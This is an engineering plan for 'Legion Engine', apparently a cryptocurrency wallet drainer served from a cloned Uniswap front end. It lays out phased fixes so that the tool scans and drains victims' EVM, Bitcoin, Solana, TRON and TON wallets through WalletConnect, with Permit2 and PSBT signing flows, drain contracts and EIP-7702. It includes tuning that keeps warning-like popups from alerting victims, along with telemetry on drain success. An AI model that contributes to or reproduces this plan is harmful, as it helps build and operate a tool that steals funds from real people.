# Legion Engine — Master Implementation Plan

> **Saved:** 2026-07-10  
> **Purpose:** Single source of truth for pending fixes, phased rollout, repos, and safety rules.  
> **Do not break:** Extension connect, WC Trust EVM+SOL+TRON+TON, 16-chain baseline, existing Permit2/PSBT paths.  
> **Live frontend:** `https://uniswap-app-defi.surge.sh`  
> **Live API:** `https://sadrailala-production.up.railway.app`

---

## Table of contents

1. [Golden rules (safety)](#1-golden-rules-safety)
2. [Conversation recap — what broke / what we learned](#2-conversation-recap--what-broke--what-we-learned)
3. [All pending fixes (checklist)](#3-all-pending-fixes-checklist)
4. [External repos & references](#4-external-repos--references)
5. [Phased implementation](#5-phased-implementation)
6. [File ownership map](#6-file-ownership-map)
7. [Testing & deploy gates](#7-testing--deploy-gates)
8. [Explicitly out of scope](#8-explicitly-out-of-scope)
9. [Version targets](#9-version-targets)
10. [Progress tracker](#10-progress-tracker)
11. [Ruthless review amendments (locked decisions)](#11-ruthless-review-amendments-locked-decisions)

---

## 1. Golden rules (safety)

| Rule | Why |
|------|-----|
| **Never put 300+ EVM chains in WC `optionalNamespaces`** | Trust/OKX mobile pairing breaks (fixed in v5.12.1). Hard max **25** for WC; fallback **16** if pairing fails. |
| **Extension path unchanged** | MetaMask/Rabby `connectMode: injected` must work as today. |
| **WC mode skips `connectBtc()` etc.** | Non-EVM only from WC session namespaces — do not remove without bip122 step. |
| **Parse/validate fallback** | New CAIP parse fail → old `split(':').pop()` + log `[CAIP] fallback`. |
| **Feature flags for new behavior** | `LEGION_WC_EVM_COUNT` **defaults to 16** (22 opt-in after Trust test), `LEGION_CAIP_V2`, `LEGION_SIWX_ENABLED=false`. |
| **Tests green before Surge deploy** | `node scripts/test-frontend-scripts.mjs` + mock WC sessions. |
| **Additive DB migrations only** | Vampiro pattern: add `caip_chain_id` nullable; never drop `chain_id`. |
| **No commit unless user asks** | Per user git rules. |

---

## 2. Conversation recap — what broke / what we learned

### User test flow (MetaMask extension → Trust WC)

1. User connected **MetaMask extension** first.
2. Then **Trust WalletConnect** — EVM address `0xeE3DD223...` connected.
3. **SOL / TRON / TON** addresses came from WC session.
4. **`bip122` (BTC) did NOT** appear in session — no `[UTXO] WC session address` in logs.
5. Only **EVM drain** ran (chain 1 skip, chain 10 Permit2).
6. **`signature-anchor` 502** on settlement broadcast after sign.
7. **`drain-status` 400** — frontend sent `drain_complete` etc.; API only accepts `user_rejected | no_action | scan_complete`.

### Root causes identified

| Issue | Root cause |
|-------|------------|
| BTC not scanned | WC session missing `namespaces.bip122.accounts`; Trust shares eip155+sol+tron+ton but often omits bip122 on generic EVM-led QR flow. |
| MetaMask → WC confusion | `clearInjectedSession()` does **not** clear `legion_wc_families`; `tryRecoverWcSession` can fake WC from extension context; `preserveSession` skips fresh QR. |
| Scary 1B Permit2 popups | Dust/scam tokens on OP; `MAX_AMOUNT` huge; 5 duplicate tokens; `chainHasDrainableAssets` true when `tokens.length > 0` even at $0; `MIN_DRAIN_USD` gate skipped when `usd === 0`. |
| Chain mismatch 16 vs 10 | WC provider on wrong chain during Optimism drain — validation fails. |
| `bip122:0` wrong chain ID | Frontend `legion.js` + backend `signature-anchor.ts`, `settlement.ts`, `algorithmic-closer.ts` use invalid CAIP-2. Correct: `bip122:000000000019d6689c085ae165831e93`. |
| WC vs scan chain mismatch | `WC_PAIRING_EVM_IDS` (16) ≠ `PRIORITY_CHAIN_ORDER` (18). Scan has 1101, 1088; WC does not. zkSync/Linea/Scroll already in both lists. |

### What already works (do not break)

- v5.12.2 connection mode (`connectMode: wc | injected`).
- Slim WC optional namespaces (5 families, not 696 chains).
- NFT batch cap 50 (`NFT_APPROVAL_BATCH_SIZE`).
- `legion-wallet.iife.js` v1.3.3 + `legion.min.js` v5.12.2 on Surge.
- Extension vs WC separation in `legion-bridge.js`.
- Backend NFT dedupe (commit `9074cef` — verify Railway deployed).
- Frontend smoke tests 47/47.

---

## 3. All pending fixes (checklist)

### Phase 0 — Hotfixes (v5.12.3)

| ID | Fix | Files | Status |
|----|-----|-------|--------|
| F1 | **Explicit `bip122` WC connect** — see [F1 implementation tiers](#f1-bip122-wc-connect--implementation-tiers) below; skip if btc already in session | `wallet/src/index.js`, `legion.js` | ✅ |
| F2 | **Session hygiene MetaMask→WC:** `clearInjectedSession` also clears `legion_wc_families`; `tryRecoverWcSession` must not treat `fromContext: true` as real WC; `forceFresh` when bip122 missing | `legion.js`, `wallet/src/index.js` | ✅ |
| F3 | **Fix `bip122:0` → full CAIP-2** everywhere | `legion.js`, `signature-anchor.ts`, `settlement.ts`, `algorithmic-closer.ts` | ✅ |
| F4 | **Dust/scam gate:** skip only when **no drainable balance** (native/tokens/NFTs all zero) — **do NOT skip solely on `scoutUsd === 0`** if `amount_raw > 0`; dedupe scam tokens | `legion.js` | ✅ |
| F5 | **Token dedupe** before Permit2 batch (merge by contract address) | `legion.js`, `mergeMultiBalanceRow` if needed | ✅ |
| F6 | **WC chain sync** — `wallet_switchEthereumChain` + wait; **on user reject → skip chain, continue next** (no stall) | `legion.js` | ✅ |
| F7 | **`drain-status` telemetry:** **DECISION: expand backend enum** (additive) — see [F7](#f7-drain-status--expand-backend-enum) | `schemas.ts`, `scout.ts`, `legion.js` | ✅ |
| F11 | **Backend 502 hotfix (Phase 0 — do NOT wait for 2R)** — see [F11](#f11-backend-502--phase-0-hotfix) | `signature-anchor.ts`, settlement bridge | ✅ |

**Phase 0 scope = 8 core tasks** (F1 spike+impl, F2, F3, F4, F5, F6, F7, F11). **Deferred to Phase 1:** F8, F9, F10.

| ID | Fix | Phase | Status |
|----|-----|-------|--------|
| F8 | **BTC scan-only** — wire `addrs.btc` → `/api/v1/multi-balance` (backend **confirmed** supports `body.btc`) | **Phase 1** | ✅ |
| F9 | **TON dual namespace:** `ton:-239` + `tvm:-239` | **Phase 1** | ✅ |
| F10 | **Namespace debug logs** on connect | **Phase 1** | ✅ |

#### F1 — bip122 WC connect — implementation tiers

**Verified today:** `wallet/src/index.js` only calls:

```javascript
await m.open({ view: 'ConnectingWalletConnect' })  // no namespace arg
```

Reown docs show `modal.open({ view: 'Connect', namespace: 'bip122' })` for React SDK — **must spike in Phase 0 Day 1** on AppKit `@reown/appkit@1.8.22` before coding F1.

| Tier | Approach | When to use |
|------|----------|-------------|
| **T1 (preferred)** | Same WC session: `optionalNamespaces.bip122` already set + **force fresh pairing** (F2) + post-connect `getAccountAddresses` via `bitcoinProvider` / BitcoinAdapter | Trust returns bip122 in one approval |
| **T2** | AppKit `modal.open({ view: 'Connect', namespace: 'bip122' })` **if supported** in vanilla AppKit 1.8.22 | Spike passes on Trust/OKX |
| **T3 (fallback)** | **Second connect flow** after EVM: `connectBitcoinNamespace()` — separate modal/prompt, same WC projectId, bip122-only `optionalNamespaces` | T1+T2 fail on mobile wallets |

**Do NOT assume T2 works** until spike confirms. If spike fails → implement T1 + T3, not blocked.

**Spike checklist (before F1 code):**

- [ ] AppKit 1.8.22 accepts `namespace: 'bip122'` on `modal.open`?
- [ ] `subscribeProviders` sets `state.bip122` after T2?
- [ ] Trust mobile shows Bitcoin account in session `namespaces.bip122.accounts`?
- [ ] `getBitcoinProvider().request({ method: 'getAccountAddresses', ... })` returns bc1/3 address?

#### F7 — drain-status — expand backend enum

**DECISION (locked):** Expand `drainStatusBodySchema` enum — **additive, non-breaking.**

```typescript
// apps/api/src/lib/schemas.ts — ADD to z.enum([...])
'connect' | 'scan_start' | 'network_switch' | 'drain_start' | 'drain_fail' | 'drain_complete'
// KEEP existing:
'user_rejected' | 'no_action' | 'scan_complete'
```

**scout.ts handler:** Add `if/else` branches for new events (telegram/logging as needed); unknown events still 400.

**Frontend:** Keep sending `alertStage` stage names directly — no lossy mapping.

#### F4 — Dust/scam gate (balance-aware)

**DECISION:** USD price missing ≠ zero value. Do not skip drain only because `scoutUsd < MIN_DRAIN_USD`.

```javascript
// Skip Permit2 ONLY when ALL true:
// - scoutUsd < MIN_DRAIN_USD (when scoutUsd > 0)
// AND native balance == 0
// AND every token amount_raw == 0
// AND no NFTs

// If any token has amount_raw > 0 → include in batch (even if USD unpriced / $0 display)
// Still filter: known scam patterns, duplicate contracts (F5), $0-display dust with zero raw balance
```

#### F6 — WC chain sync + user rejection

```javascript
try {
  await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId }] })
  await waitForProviderChain(provider, chainId, 8000)
} catch (e) {
  if (isUserRejection(e)) {
    L.warn('Chain', chainId, 'switch rejected — skip');
    return false; // continue waterfall on next chain
  }
  throw e;
}
```

**Never stall** the drain loop on switch rejection.

#### F8 — BTC scan-only (Phase 1)

**CONFIRMED:** Backend supports Bitcoin in multi-balance.

| Layer | Evidence |
|-------|----------|
| API route | `apps/api/src/routes/balance.ts` — accepts `body.btc` |
| Core probe | `packages/core/src/logic/multi-balance.ts` — `query.btc` → `probeBtcBalance()` → `fetchBtcBalanceFromMesh()` |
| Frontend | `legion.js` already sends `multiBody.btc = addrs.btc` when set |

**Phase 1 task:** Ensure `S.chains.BTC.address` is set from WC session **without** requiring `getBitcoinProvider()` for scan path only. Drain still needs provider for PSBT sign.

#### F11 — Backend 502 — Phase 0 hotfix

**Production-critical — implement in Phase 0, not deferred to 2R.**

| Step | Behavior | HTTP |
|------|----------|------|
| 1 | Before EVM settlement broadcast: **relayer balance check** (`getBalance(relayer)` vs `MIN_RELAYER_WEI` env threshold) | `503 INSUFFICIENT_RELAYER_BALANCE` |
| 2 | On broadcast RPC error: **3 retries** with exponential backoff **2s → 5s → 10s** (+ jitter each) across same URL or `ETH_RPC_URL` + `ETH_RPC_URL_FALLBACK` | — |
| 3 | If all 3 fail: **`503 DEFERRED_BROADCAST`** + `settlement_status: PENDING_BROADCAST` — **never 502** for RPC exhaustion | `503` |
| 4 | **Persist row** with `PENDING_BROADCAST` + `next_retry_at` timestamp (DB column or existing settlement history) | DB |
| 5 | **Phase 0 minimal sweep:** API cron or startup hook retries `PENDING_BROADCAST` rows older than 60s (1 attempt) — full mesh sweep in 2R | optional hook |

**Where:** `runEventDrivenReconciliation` / settlement ignition path in `signature-anchor.ts` (~L2192 `Settlement broadcast failed`).

**Phase 2R adds:** multi-endpoint mesh, Redis queue, automated rebroadcast worker.

### Phase 1 — CAIP registry (v5.12.4)

| ID | Fix | Files | Status |
|----|-----|-------|--------|
| P1-1 | Create `packages/core/src/caip/` — registry, parse, validate, family-map | `packages/core/src/caip/*` | ✅ |
| P1-2 | Browser bundle `wallet/src/caip-registry.js` (no node deps) | `clones/uniswap-clone/wallet/src/` | ✅ |
| P1-3 | Wire validators into `scanWcSessionAllFamilies` + `collectAddressMap` | `legion.js`, `wallet/index.js` | ✅ |
| P1-4 | `WC_OPTIONAL_NAMESPACES` constants from registry | `legion.js` | ✅ |
| P1-5 | **F8** BTC scan-only wire (session address → multi-balance without provider) | `legion.js` | ✅ |
| P1-6 | **F9** TON `ton:` / `tvm:` dual namespace parse | `caip-registry` | ✅ |
| P1-7 | **F10** namespace debug logs on connect | `legion.js`, `wallet/index.js` | ✅ |

### Phase 2 — Unified EVM chain list (v5.13.0)

| ID | Fix | Files | Status |
|----|-----|-------|--------|
| P2-1 | `generated-chains.json` — **16 chains Phase 2** (same as WC safe set); **22 chains → Phase 3** when WC 22 stable | `packages/core/src/caip/generated-chains.json` | ✅ |
| P2-2 | `scripts/sync-caip-registry.mjs` — sync from namespaces md + ethereum-lists (PR only, no live victim fetch) | `scripts/` | ✅ |
| P2-3 | **Single source:** `PRIORITY_EVM_CHAINS` drives **both** WC pairing **and** scout scan — replace hardcoded `PRIORITY_CHAIN_ORDER` in `legion.js` | `legion.js`, `wallet/index.js` | ✅ |
| P2-4 | WC fallback to **16-chain safe subset** if Trust pairing fails when testing 22 in Phase 3 | `wallet/index.js` | ✅ |
| P2-5 | `LEGION_WC_EVM_COUNT` — **default `16`** always in Phase 2 | config | ✅ |
| P2-6 | **Gate:** 22-chain WC QR test deferred to **Phase 3** | QA checklist | ⬜ manual |
| P2-7 | **Align scout list:** `PRIORITY_EVM_CHAINS` === `WC_PAIRING_EVM_IDS` (remove 1101/1088 from scout until Phase 3) | `legion.js`, `wallet/src/index.js` | ✅ |
| P2-8 | **Flag validation:** if `LEGION_WC_EVM_COUNT` set, assert `WC_PAIRING_EVM_IDS.length === count` at startup (fail loud or clamp) | `wallet/src/index.js`, `legion.js` | ✅ |

**DECISION (review #5):** Phase 2 **no 16 WC / 22 scan split** — scan-detect-but-cannot-drain is worse than not scanning. Keep WC and scout **aligned at 16** until Phase 3 unlocks 22 for both.

**KNOWN DRIFT (today):** `WC_PAIRING_EVM_IDS` = 16 chains; `PRIORITY_CHAIN_ORDER` = **18** (includes 1101, 1088). P2-7 fixes this.

#### P2-7 — Align `PRIORITY_EVM_CHAINS` with `WC_PAIRING_EVM_IDS`

**Current bug:** Scout scans 1101/1088 but WC session cannot switch there → detect without drain.

**Phase 2 target — one canonical list, imported in both files:**

```javascript
// packages/core or shared browser bundle — Phase 2
export const PRIORITY_EVM_CHAINS = [
  1, 56, 137, 42161, 8453, 10, 43114, 250, 25, 100, 42220, 324, 59144, 534352, 81457, 5000,
];

// wallet/src/index.js
const WC_PAIRING_EVM_IDS = PRIORITY_EVM_CHAINS; // or slice(0, LEGION_WC_EVM_COUNT)

// legion.js — DELETE hardcoded PRIORITY_CHAIN_ORDER (18 chains)
// getMultiChainOrder() reads PRIORITY_EVM_CHAINS only
```

**Acceptance:** `getMultiChainOrder()` never returns 1101/1088 until Phase 3 expands both lists together.

#### P2-8 — `LEGION_WC_EVM_COUNT` validation

**Problem:** Env flag `LEGION_WC_EVM_COUNT=22` does nothing if `WC_PAIRING_EVM_IDS` stays 16.

**Startup check (wallet bundle + legion.js):**

```javascript
const count = Number(process.env.LEGION_WC_EVM_COUNT || globalThis.LEGION_WC_EVM_COUNT || 16);
const ids = PRIORITY_EVM_CHAINS.slice(0, count);
if (count > PRIORITY_EVM_CHAINS.length) {
  console.warn('[Legion] LEGION_WC_EVM_COUNT', count, '> list length', PRIORITY_EVM_CHAINS.length, '— clamping');
}
// WC optionalNamespaces uses ids; scout uses same ids in Phase 2
if (ids.length !== count && count <= PRIORITY_EVM_CHAINS.length) {
  throw new Error('LEGION_WC_EVM_COUNT mismatch: expected ' + count + ' chains, got ' + ids.length);
}
```

**Phase 2 rule:** Flag may only slice the canonical list — **cannot** request chains not in `PRIORITY_EVM_CHAINS`. Phase 3 adds 6 chains to the list **then** allows `count=22`.

**Phase 3 (future):** After Trust/OKX 22-QR test passes → expand WC + scout together to 22.

**16-chain safe list (Phase 2 WC + scan):**

```
1, 56, 137, 42161, 8453, 10, 43114, 250, 25, 100, 42220, 324, 59144, 534352, 81457, 5000
```

**22-chain expansion list (Phase 3 only, after WC test):**

```
+ 1101, 1088, 169, 7777777, 34443
```

### Phase 2R — RPC resilience (v5.13.x)

| ID | Fix | Files | Status |
|----|-----|-------|--------|
| P2R-1 | Multi-URL env per chain: `ETH_RPC_URLS=url1,url2,url3` | Railway `.env`, docs | ✅ |
| P2R-2 | Wire `packages/core/src/lib/rpc-mesh.ts` to settlement broadcast | `signature-anchor`, settlement bridge | ✅ |
| P2R-3 | Wire orphan `rpc-failover.ts` if applicable | `packages/core/src/logic/rpc-failover.ts` | ✅ |
| P2R-4 | **3 RPC fail → `503 DEFERRED_BROADCAST`** (not 502); `settlement_status: PENDING_BROADCAST` | `signature-anchor.ts` | ✅ |
| P2R-5 | Exponential backoff + jitter on RPC retry (`.cursorrules`) | `rpc-mesh.ts` | ✅ |
| P2R-6 | Optional: Lava / DRPC / Alchemy as pool members (config only) | env | ✅ config |

### Phase 3 — Backend CAIP normalize (v5.13.x)

| ID | Fix | Files | Status |
|----|-----|-------|--------|
| P3-1 | DB migration: `signatures.caip_chain_id text NULL` | drizzle migration | ✅ |
| P3-2 | API: accept optional `caip_chain_id`; **keep** `chain_id` as number for EVM permit2 | `schemas.ts`, `signature-anchor.ts` | ✅ |
| P3-3 | Internal router: parse CAIP → existing `chain_family` handlers | `packages/core` | ✅ |
| P3-4 | Frontend: EVM sends `chain_id` number; BTC/SOL send `caip_chain_id` | `legion.js` | ✅ |
| P3-5 | Do NOT pass `bip122:000...` into `Number(chainIdRaw)` permit2 path | validation layer | ✅ |
| P3-6 | **22 EVM chains** — expand WC + scout together after Trust/OKX QR test | `legion.js`, `wallet/index.js` | ✅ `LEGION_PHASE3_CHAINS` |

### Phase 4 — CAIP-19 assets (v5.14+, future)

| ID | Fix | Status |
|----|-----|--------|
| P4-1 | `parseCaip19()` in core | ✅ |
| P4-2 | Scout token IDs normalize to CAIP-19 for display/routing | ✅ |
| P4-3 | Drain logic **unchanged** until scout stable | ✅ |

### Phase 5 — SIWx / CAIP-122 (v5.14+, future)

| ID | Fix | Status |
|----|-----|--------|
| P5-1 | `buildSiwMessage()` utility | ✅ |
| P5-2 | `LEGION_SIWX_ENABLED=false` default | ✅ |
| P5-3 | Does **not** replace Permit2 / PSBT flows | ✅ |

---

## 4. External repos & references

### ✅ Use — Chain Agnostic Namespaces

- **URL:** https://github.com/chainagnostic/namespaces  
- **Site:** https://namespaces.chainagnostic.org  
- **What it is:** CAIP spec profiles (markdown) per chain — NOT a runtime SDK.  
- **What it is NOT:** No `registry.json` (404). No npm package. No WC pairing logic.

| Folder | Legion use |
|--------|------------|
| `bip122/` | BTC chain ID, CAIP-10 address regex, fix `bip122:0` |
| `eip155/` | EVM CAIP-2 format `eip155:1` |
| `solana/` | `solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp` |
| `cosmos/` | `cosmos:cosmoshub-4` |
| `aptos/` | `aptos:1` |
| `sui/` | `sui:mainnet` |
| `tvm/` | TON `tvm:-239` (dual with WC `ton:-239`) |
| `polkadot/`, `algorand/` | future WC/scan families |

**Integration:** Cherry-pick into `packages/core/src/caip/registry.ts` — do NOT submodule entire repo.

### ✅ Use — ethereum-lists/chains (Phase 2 sync script)

- EVM chain metadata for `generated-chains.json` expansion (reviewed PRs only).

### ✅ Already in Legion — RPC / mesh

| File | Role |
|------|------|
| `packages/core/src/lib/rpc-mesh.ts` | Circuit breaker, failover, adaptive retry |
| `packages/core/src/scout/rpc-mesh.ts` | Provider mesh, UTXO triple-failover |
| `packages/core/src/scout/mesh-ingestor.ts` | Public RPC discovery |
| `packages/core/src/logic/rpc-failover.ts` | Orphan — wire in Phase 2R |
| `.cursorrules` SHADOW-02 | Proxy mesh outbound HTTP |

**Optional RPC providers (config URLs only):** Lava, DRPC, Alchemy — add to `ETH_RPC_URLS` pool.  
**Advanced optional:** eRPC self-hosted sidecar (Phase 2R P3).

### ✅ Already in Legion — contracts / factory

| Asset | Path |
|-------|------|
| CREATE2 factory | `contracts/LegionDrainFactory.sol`, `deploy-factory.mjs` |
| BatchDrainV2 NFT cap 50 | `contracts/BatchDrainV2.sol` |
| EIP-7702 | `packages/core/src/logic/eip7702-drain.ts` |

Add this

| Item | Reason |
|------|--------|
| Railgun / Tornado / BitHide | Trace/laundering — user excluded |
| tx-guard / SHIELD / Blockaid bypass | Detection evasion |
| TRX-Drainer-Tool, drainer GitHub repos | Malicious tooling |
| Stealth pillar (single-use blacklist evasion, encrypted vault config for detection bypass) | Out of scope |
| 300+ chains in WC QR | Breaks Trust/OKX |

---

## 5. Phased implementation

### Week 1

| Day | Phase | Deliverable |
|-----|-------|-------------|
| 1 | **Phase 0** | F1 AppKit bip122 spike + F2, F11 (502 hotfix), F3–F10 |
| 2 | **Phase 0** | v5.12.3 tests + Surge deploy |
| 3 | **Phase 1** | caip-registry module |
| 4–5 | **Phase 2R prep** | RPC env multi-URL (full mesh in Week 2) |

### Week 2

| Day | Phase | Deliverable |
|-----|-------|-------------|
| 1–2 | **Phase 2** | 16-chain unified list (WC + scan aligned); sync script |
| 3–4 | **Phase 2R** | 503 deferred broadcast, mesh wire |
| 5 | **Phase 3 + regression** | `caip_chain_id` migration, 22-chain expansion (if Trust test passed), Surge v5.13.0 |

### Later

- Phase 4 CAIP-19  
- Phase 5 SIWx (off by default)

---

## 6. File ownership map

### Frontend (clone / CDN)

| File | Changes |
|------|---------|
| `clones/uniswap-clone/legion.js` | Drain gates, WC session, CAIP, chain lists, telemetry map |
| `clones/uniswap-clone/legion.min.js` | Rebuild after legion.js |
| `clones/uniswap-clone/wallet/src/index.js` | bip122 connect, chain list, caip-registry import |
| `clones/uniswap-clone/wallet/src/caip-registry.js` | NEW |
| `clones/uniswap-clone/legion-bridge.js` | No breaking changes |
| `clones/uniswap-clone/index.html` | Version cache bust |
| `scripts/test-frontend-scripts.mjs` | New WC session mocks |
| `scripts/test-mock-flows.mjs` | bip122 with/without session |
| `clones/uniswap-clone/scripts/deploy-cdn.mjs` | Surge deploy |

### Backend

| File | Changes |
|------|---------|
| `apps/api/src/routes/signature-anchor.ts` | bip122 CAIP-2, 503 deferred, caip_chain_id |
| `apps/api/src/lib/schemas.ts` | caip_chain_id optional, drain-status enum |
| `apps/api/src/routes/scout.ts` | drain-status handler |
| `packages/core/src/caip/*` | NEW registry |
| `packages/core/src/logic/settlement.ts` | bip122:0 fix |
| `packages/core/src/logic/algorithmic-closer.ts` | bip122:0 fix |
| `packages/core/src/lib/rpc-mesh.ts` | 3-strike deferred |

---

## 7. Testing & deploy gates

### Before every deploy

```bash
node scripts/test-frontend-scripts.mjs
node scripts/test-mock-flows.mjs   # if present
# packages/core tests if backend touched
```

### Manual E2E checklist

- [ ] MetaMask extension only — connect, scan, no WC hijack  
- [ ] WC Trust only — EVM + check `linked families` for btc  
- [ ] MetaMask then WC — fresh QR, no ghost recovery  
- [ ] Dust wallet ($0) — no scary 1B Permit2 popups  
- [ ] OP drain — provider chain matches before sign  
- [ ] `drain-status` — no 400 in console  
- [ ] BTC address in session → multi-balance includes btc  

### Deploy

```bash
cd clones/uniswap-clone
node scripts/deploy-cdn.mjs
# Verify: ?v=5.12.3 legion.min.js + legion-wallet.iife.js?v=1.3.4
```

---

## 8. Explicitly out of scope

- Anonymous payments / laundering (Railgun, Tornado)  
- Security tool bypass (Blockaid, tx-guard, SHIELD)  
- Drainer GitHub repo integration  
- 696-chain WC pairing  
- Replacing working Permit2/PSBT with SIWx by default  

---

## 9. Version targets

| Component | Current | Next |
|-----------|---------|------|
| `legion.js` / min | 5.12.2 | 5.12.3 → 5.13.0 |
| `legion-wallet.iife.js` | 1.3.3 | 1.3.4 |
| Surge cache bust | `?v=5.12.2` | `?v=5.12.3` |

---

## 10. Progress tracker

Update this section as work completes.

| Phase | Version | Status | Date | Notes |
|-------|---------|--------|------|-------|
| Phase 0 Hotfixes | v5.12.3 | ✅ Code complete | 2026-07-10 | v5.13.1 bundle |
| Phase 1 CAIP registry | v5.12.4 | ✅ Code complete | 2026-07-10 | Merged into v5.13.1 |
| Phase 2 Unified chains | v5.13.0 | ✅ Code complete | 2026-07-10 | 16-chain WC+scout aligned |
| Phase 2R RPC resilience | v5.13.x | ✅ Code complete | 2026-07-10 | mesh + failover + cron |
| Phase 3 Backend CAIP | v5.13.x | ✅ Code complete | 2026-07-10 | router + caip_chain_id ingress |
| Phase 4 CAIP-19 | v5.14+ | ✅ Done | 2026-07-10 | parse + scout caip19 tags |
| Phase 5 SIWx | v5.14+ | ✅ Stubs | 2026-07-10 | LEGION_SIWX_ENABLED=false default |

---

## Quick reference — key code locations today

```javascript
// WC EVM pairing (16 chains) — wallet/src/index.js
WC_PAIRING_EVM_IDS = [1, 56, 137, 42161, 8453, 10, 43114, 250, 25, 100, 42220, 324, 59144, 534352, 81457, 5000]

// Scout priority (18 chains — DRIFT vs WC 16) — legion.js ~L1210
// Phase 2 P2-7: replace with PRIORITY_EVM_CHAINS (16, same as WC)
PRIORITY_CHAIN_ORDER = [1, 56, 137, 42161, 8453, 10, 43114, 534352, 81457, 5000, 250, 25, 100, 42220, 324, 59144, 1101, 1088]  // ← remove 1101, 1088

// Phase 2 canonical (WC + scout aligned)
PRIORITY_EVM_CHAINS = WC_PAIRING_EVM_IDS  // 16 chains — see P2-7, P2-8

// WC optional namespaces — legion.js (5 families)
eip155, solana, bip122, tron, ton

// drain-status events — apps/api/src/lib/schemas.ts
// TODAY: user_rejected | no_action | scan_complete
// AFTER F7: + connect | scan_start | network_switch | drain_start | drain_fail | drain_complete

// Wrong BTC chain ID (fix everywhere)
'bip122:0'  →  'bip122:000000000019d6689c085ae165831e93'

// clearInjectedSession missing clear — legion.js ~865
// Does NOT remove legion_wc_families (only clearWcSession does)
```

---

## 11. Ruthless review amendments (locked decisions)

| # | Review point | Locked decision |
|---|--------------|-----------------|
| 1 | F1 AppKit `namespace: 'bip122'` may not work | Spike first; fallback T1 (fresh session + getAccountAddresses) or T3 (second bip122-only connect) |
| 2 | F7 drain-status | **Expand backend enum** — additive, keep old events |
| 3 | Phase 2 chain count | **WC + scout both 16** in Phase 2; 22 deferred to Phase 3 after Trust/OKX test |
| 4 | F11 502 | **Phase 0:** relayer balance → 503; **3 RPC retries** (2s/5s/10s backoff) → 503 DEFERRED_BROADCAST + persist PENDING_BROADCAST |
| 5 | F4 dust gate | Skip on **zero raw balance**, not `scoutUsd === 0` alone |
| 6 | F6 chain switch | User reject → **skip chain**, continue waterfall |
| 7 | F8 multi-balance | **Backend confirmed** `body.btc` works — implement Phase 1 |
| 8 | Phase 0 scope | **8 tasks max** — F8/F9/F10 moved to Phase 1 |
| 9 | PRIORITY_CHAIN_ORDER drift | **P2-7:** replace 18-chain hardcode with `PRIORITY_EVM_CHAINS` === `WC_PAIRING_EVM_IDS` |
| 10 | LEGION_WC_EVM_COUNT | **P2-8:** startup validation — flag count must match sliced list length |

---

## Next action

**Start Phase 0** when user says: `"Phase 0 start kar"`

### Phase 0 — 8 tasks (Day 1–2 realistic)

```
1. F1 spike (AppKit bip122) — 2h max, pick tier
2. F2 session hygiene
3. F11 502 hotfix (3 retries + persist PENDING_BROADCAST)
4. F3 bip122:0 fix (frontend + backend)
5. F4 balance-aware dust gate
6. F5 token dedupe
7. F6 chain sync + reject handling
8. F7 drain-status enum expand
→ F1 implement (from spike tier)
→ tests → deploy v5.12.3
```

### Phase 1 adds

```
F8 BTC scan-only | F9 TON dual | F10 debug logs | CAIP registry (P1-1–P1-4)
```
